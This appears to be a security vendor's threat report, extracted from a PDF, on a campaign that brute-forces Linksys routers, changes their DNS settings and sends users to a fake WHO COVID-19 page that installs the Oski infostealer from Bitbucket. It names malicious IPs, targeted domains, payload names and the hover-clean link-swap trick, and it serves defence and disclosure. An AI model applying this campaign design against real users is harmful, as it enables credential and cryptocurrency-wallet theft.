Bitdefender researchers have recently found a new attack that targets home routers and
changes their DNS settings to redirect victims to a malware-serving website that delivers
the Oski infostealer as a final payload.
What’s interesting about the attack is that it stores malicious payloads using Bitbucket, the
popular web-based version control repository hosting service. To make sure the victim
doesn’t suspect foul play, attackers also abuse TinyURL, the popular URL-shortening web
service, to hide the link to the Bitbucket payload.
Sure enough, the webpage to which users are redirected mentions the Coronavirus
pandemic, promising to offer for download an application that will give out “the latest
information and instructions about coronavirus (COVID-19)”.
COVID-19 is a recurring theme that cybercriminals have been abusing to trap victims.
Malicious reports involving coronavirus-themed malware have increased five-fold in March
from February, with attackers using phishing scams that exploit Coronavirus misinformation
and fear regarding medical supply shortage.

Key findings:
Mostly targets Linksys routers, bruteforcing remote management credentials
Hijacks routers and alters their DNS IP addresses
Redirects a specific list of webpages/domains to a malicious Coronavirus-themed
webpage
Uses Bitbucket to store malware samples

How the attack works
While it’s not uncommon for hackers to piggyback global news, such as the pandemic, to
deliver phishing emails laced with tainted attachments, this recent development proves they
are nothing if not creative in compromising victims.
Attackers seem to have been probing the internet for vulnerable routers, managing to
compromise them – potentially via bruteforcing passwords – and changing their DNS IP
settings.
DNS settings are very important, as they work like a phone book. Whenever users type in
the name of a website, DNS services can send them to the corresponding IP address that
serves that particular domain name. In a nutshell, DNS works pretty much like your
smartphones agenda: whenever you want to call someone you just look up their name
instead of having to memorize their phone number.
Once attackers change the DNS IP addresses, they can resolve any request and redirect
users to webpages that attackers control, without anyone being the wiser.
The DNS IP address are as follows:
109.234.35.230
94.103.82.249
Below is a list of some of the targeted domains that are redirected:
“aws.amazon.com”
“goo.gl”
“bit.ly”
“washington.edu”
“imageshack.us”
“ufl.edu”
“disney.com”
“cox.net”
“xhamster.com”
“pubads.g.doubleclick.net”
“tidd.ly”
“redditblog.com”
“fiddler2.com”
“winimage.com”

3/10

When trying to reach one of the domains above, users are actually redirected towards an IP
address, 176.113.81.159, 193.178.169.148, 95.216.164.181, that displays a message
purportedly from the World Health Organization, telling users to download and install an
application that offers instructions and information about COVID-19.
What’s interesting is that, by changing the DNS settings on the router, users would actually
believe they’ve landed on a legitimate webpage, except that it’s served from a different IP
address. For example, when users type “example.com”, instead of the webpage being
served from a legitimate IP address, it would be served from an attacker-controlled IP
that’sresolved by the malicious DNS settings. If the attacker-controlled webpage is a spoton facsimile, users would actually believe they’ve landed on a legitimate webpage, judging
from the domain name in the browser’s address bar.
As in the screenshot below, whenever victims wanted to visit one of the targeted domains
listed above, attackers would simply display a message as if prompted by the legitimate
domain. Since the domain name displayed in the browser’s address bar is unchanged,
victims would have no reason to believe that the viewed message is being served from an
attacker-controlled IP address.

The download button has the “href” tag (hyperlink) set to https://google.com/chrome so it
seems clean when the victim hovers over the button. But actually an “on-click” event is set
that changes the URL to the malicious one, hidden in the URL shortened with TinyURL.

4/10

As soon as users hit “Download”, they actually download the malicious .exe file from the
Bitbucket repository, completely unaware.

To make the file seem legitimate (as if the filename is any indication of legitimacy), attackers
named it “runset.EXE”, “covid19informer.exe”, or “setup_who.exe”.
Judging from the flow of the attack, it seems that the initial payload is actually a downloader,
for which we have seen two variants:
a cab file which has embedded a .net file that uses TinyUrl service to download from
the bitbucket repo the final payload
an autohotkey script which will directly download from the bitbucket repo the final
payload.

}

In the final stage of the attack a malicious file packed with MPRESS is downloaded. This
payload is the Oski stealer that communicates with a C&C server for uploading the stolen
information.
Oski is a relatively new infostealer that seems to have emerged in late 2019. Some of the
features that it packs revolve around extracting browser credentials and cryptocurrency
wallet passwords, and its creators even brag that it can extract credentials stored in SQL
databases of various Web browsers and Windows Registry.
During the first stage, we also observed that the .net files have a URL
(hxxps://iplogger[.]org/1l8Gp) that points to a statistics webpage that attackers could use to
keep track of infected IP addresses and the number of infected victims.

Victims
The current number of potential victims during the past couple of days is estimated at about
1,193, judging from the cumulative number of downloads from the two Bitbucket
repositories we found to still be up.
During the investigation, Bitdefender researchers found 4 Bitbucket repositories. This
means that the number of victims could be a lot higher, as Bitbucket has already taken
down the other two repositories, preventing us from having a complete picture of the
number of victims.
Another hit that reveals this to be a relatively new attack is Bitdefender’s telemetry showing
that it all started on March 18th, with a peak in activity on March 23rd (Fig. 1).
We estimate that the number of victims is likely to grow in the coming weeks, especially if
attackers have set up other repositories, whether hosted on Bitbucket or other code
repository hosting services, as the Coronavirus pandemic remains a “hot topic”.

6/10

While attackers are likely probing the internet for victims that have vulnerable routers,
Bitdefender’s own telemetry shows that victims in Germany, France, and the United States
account for over 73 percent of the total. These countries are also among those most
affected by the Coronavirus outbreak, potentially explaining why attackers use the themed
website.

It’s still unclear how routers are being compromised but, based on available telemetry, it
seems that attackers are bruteforcing some Linksys router models, either by directly
accessing the router’s management console exposed online or by bruteforcing the Linksy
cloud account.
These Linksys router features enable users to remotely dial into their home network from a
browser or mobile device, by using a Linksys cloud account that can be accessed from
outside the home network. Since most of the targeted routers seem to involve this particular
manufacturer, it’s plausible that this is also an attack vector that attackers exploit.

7/10

Stay Safe!
It’s recommended that, besides changing the router’s control panel access credentials
(which are hopefully not the default ones), users should change their Linksys cloud account
credentials, or any remote management account for their routers, to avoid any takeovers via
bruteforcing or credential-stuffing attacks.
Of course, making sure that your router’s firmware is always up to date is also heartily
recommended, as it prevents attackers from exploiting unpatched vulnerabilities to take
over the device.
Last, but surely not least, make sure all of your devices have a security solution installed
that can prevent you from accessing phishing or fraudulent websites and from downloading
and installing malware.

Indicators of Compromise
The indicators of compromise involve the downloader, the final stage payload, the URLs to
the repository, and the C&C of the final stage payload.
